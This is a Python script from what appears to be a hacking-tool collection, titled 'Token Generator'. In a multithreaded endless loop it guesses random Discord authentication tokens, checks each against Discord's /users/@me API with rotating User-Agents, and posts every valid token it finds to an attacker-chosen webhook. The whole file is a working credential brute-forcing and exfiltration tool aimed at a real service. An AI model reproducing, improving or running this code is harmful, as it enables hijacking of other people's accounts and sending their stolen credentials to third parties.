# Copyright (c) 2025-2026 v4lkyr0 — Buildware-Tools
# See the file 'LICENSE' for copying permission.
# --------------------------------------------------------
# EN: Non-commercial use only. Do not sell, remove credits
#     or redistribute without prior written permission.
# FR: Usage non-commercial uniquement. Ne pas vendre, supprimer
#     les crédits ou redistribuer sans autorisation écrite.

from Plugins.Utils import *
from Plugins.Config import *

try:
    import json
    import random
    import requests
    import string
    import threading
except Exception as e:
    MissingModule(e)

Title("Token Generator")
Connection()

Scroll(GradientBanner(discord_banner))

try:
    webhook = ChoiceWebhook()

    try:
        threads_number = int(input(f"{INPUT} Threads {red}->{reset} ").strip())
    except:
        ErrorNumber()

    print(f"{LOADING} Generating..", reset)

    def SendWebhook(embed_content):
        payload = {
            'embeds'    : [embed_content],
            'username'  : username_webhook,
            'avatar_url': avatar_webhook,
        }
        requests.post(webhook, data=json.dumps(payload), headers={"Content-Type": "application/json", "User-Agent": RandomUserAgents()})

    def TokenCheck():
        token_chars = string.ascii_letters + string.digits + '-_'
        first_part  = ''.join(random.choice(token_chars) for _ in range(random.choice([24, 26])))
        second_part = ''.join(random.choice(token_chars) for _ in range(6))
        third_part  = ''.join(random.choice(token_chars) for _ in range(38))
        token       = f"{first_part}.{second_part}.{third_part}"

        response = requests.get('https://discord.com/api/v9/users/@me', headers={"Authorization": token, "User-Agent": RandomUserAgents()})

        if response.status_code == 200:
            embed_content = {
                "title"      : "Token found!",
                "description": f"**Token:**\n```{token}```",
                "color"      : color_embed,
                "footer"     : {"text": username_webhook, "icon_url": avatar_webhook},
            }
            SendWebhook(embed_content)
            print(f"{SUCCESS} Status:{red} Valid   {white}| Token:{red} {token}", reset)
        else:
            print(f"{ERROR} Status:{red} Invalid {white}| Token:{red} {token}", reset)

    def Request():
        threads = []
        for _ in range(threads_number):
            t = threading.Thread(target=TokenCheck)
            t.start()
            threads.append(t)
        for thread in threads:
            thread.join()

    while True:
        Request()

except Exception as e:
    Error(e)